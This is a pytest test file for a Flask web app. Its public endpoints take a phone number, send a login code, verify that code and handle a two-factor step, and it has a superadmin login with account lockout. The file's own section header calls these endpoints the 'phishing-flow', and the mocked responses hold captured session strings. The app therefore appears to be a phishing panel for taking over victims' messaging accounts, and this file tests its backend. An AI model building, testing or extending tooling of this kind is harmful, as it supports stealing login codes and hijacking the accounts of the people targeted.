"""
Tests for the public-facing API endpoints (/api/send_code, /api/verify)
and admin login flow.
"""
import os
import tempfile
import pytest
from unittest.mock import patch
from web.app import create_app
from web.extensions import db as _db
from models.user import User


@pytest.fixture
def app():
    """Create a Flask test application backed by a temporary SQLite file.

    A file-based database avoids the connection-sharing caveat of SQLite
    in-memory databases, ensuring that tables created in fixture setup are
    visible across all sessions/connections during the test.
    """
    db_fd, db_path = tempfile.mkstemp(suffix='.db')
    test_app = create_app({
        'TESTING': True,
        'SQLALCHEMY_DATABASE_URI': f'sqlite:///{db_path}',
        'WTF_CSRF_ENABLED': False,
    })
    with test_app.app_context():
        _db.create_all()
        yield test_app
        _db.drop_all()
    os.close(db_fd)
    os.unlink(db_path)


@pytest.fixture
def client(app):
    return app.test_client()


@pytest.fixture
def admin_user(app):
    """Create and persist a test admin user within the already-active app context."""
    user = User(username='testadmin', role='superadmin')
    user.set_password('testpassword')
    _db.session.add(user)
    _db.session.commit()
    return user


# ---------------------------------------------------------------------------
# Public phishing-flow endpoint tests
# ---------------------------------------------------------------------------

class TestSendCodeEndpoint:
    def test_missing_phone_returns_error(self, client):
        resp = client.post('/api/send_code', json={})
        assert resp.status_code == 400
        assert resp.get_json()['status'] == 'error'

    def test_empty_phone_returns_error(self, client):
        resp = client.post('/api/send_code', json={'phone': ''})
        assert resp.status_code == 400

    @patch('web.routes.public.asyncio.run')
    def test_successful_send_code(self, mock_run, client):
        mock_run.return_value = {
            'status': 'success',
            'phone_code_hash': 'abc123',
            'session_string': 'sess_xyz',
            'timeout': 120,
        }
        resp = client.post('/api/send_code', json={'phone': '380991234567'})
        assert resp.status_code == 200
        data = resp.get_json()
        assert data['status'] == 'success'
        assert 'sid' in data
        assert data['timeout'] == 120

    @patch('web.routes.public.asyncio.run', side_effect=RuntimeError('network error'))
    def test_send_code_server_error(self, mock_run, client):
        resp = client.post('/api/send_code', json={'phone': '380991234567'})
        assert resp.status_code == 500
        assert resp.get_json()['status'] == 'error'


class TestVerifyEndpoint:
    def test_missing_sid_returns_error(self, client):
        resp = client.post('/api/verify', json={'sid': 'nonexistent', 'code': '12345'})
        assert resp.status_code == 400
        assert resp.get_json()['status'] == 'error'

    @patch('web.routes.public.asyncio.run')
    def test_successful_verify(self, mock_run, client):
        # First, plant a pending session directly
        from web.routes.public import _pending_sessions
        _pending_sessions['test_sid'] = {
            'phone': '380991234567',
            'phone_code_hash': 'abc123',
            'session_string': 'sess_xyz',
            'timeout': 120,
        }
        mock_run.return_value = {'status': 'success', 'user_id': 42}

        resp = client.post('/api/verify', json={'sid': 'test_sid', 'code': '12345'})
        assert resp.status_code == 200
        assert resp.get_json()['status'] == 'success'
        # Session should be cleared on success
        assert 'test_sid' not in _pending_sessions

    @patch('web.routes.public.asyncio.run')
    def test_need_2fa_response(self, mock_run, client):
        from web.routes.public import _pending_sessions
        _pending_sessions['test_sid_2fa'] = {
            'phone': '380991234567',
            'phone_code_hash': 'abc123',
            'session_string': 'sess_xyz',
            'timeout': 120,
        }
        mock_run.return_value = {'status': 'need_2fa'}

        resp = client.post('/api/verify', json={'sid': 'test_sid_2fa', 'code': '12345'})
        assert resp.status_code == 200
        assert resp.get_json()['status'] == 'need_2fa'
        # Session should remain for the 2FA step
        assert 'test_sid_2fa' in _pending_sessions


# ---------------------------------------------------------------------------
# Admin login tests
# ---------------------------------------------------------------------------

class TestAdminLogin:
    def test_login_page_loads(self, client):
        resp = client.get('/admin/login')
        assert resp.status_code == 200

    def test_login_redirects_on_success(self, client, admin_user, app):
        resp = client.post('/admin/login', data={
            'username': 'testadmin',
            'password': 'testpassword',
            'otp': '',
        }, follow_redirects=False)
        # A successful login should redirect to the dashboard
        assert resp.status_code == 302
        assert '/admin' in resp.headers.get('Location', '')

    def test_login_fails_wrong_password(self, client, admin_user, app):
        resp = client.post('/admin/login', data={
            'username': 'testadmin',
            'password': 'wrongpassword',
            'otp': '',
        })
        assert b'danger' in resp.data or resp.status_code == 200

    def test_login_locked_account_rejected(self, client, admin_user, app):
        """A locked account should be rejected even with correct credentials."""
        from datetime import datetime, timedelta, timezone
        user = _db.session.query(User).filter_by(username='testadmin').first()
        user.locked_until = datetime.now(timezone.utc) + timedelta(minutes=15)
        _db.session.commit()

        resp = client.post('/admin/login', data={
            'username': 'testadmin',
            'password': 'testpassword',
            'otp': '',
        })
        # Should not redirect to dashboard – stay on login page
        assert b'danger' in resp.data or resp.status_code == 200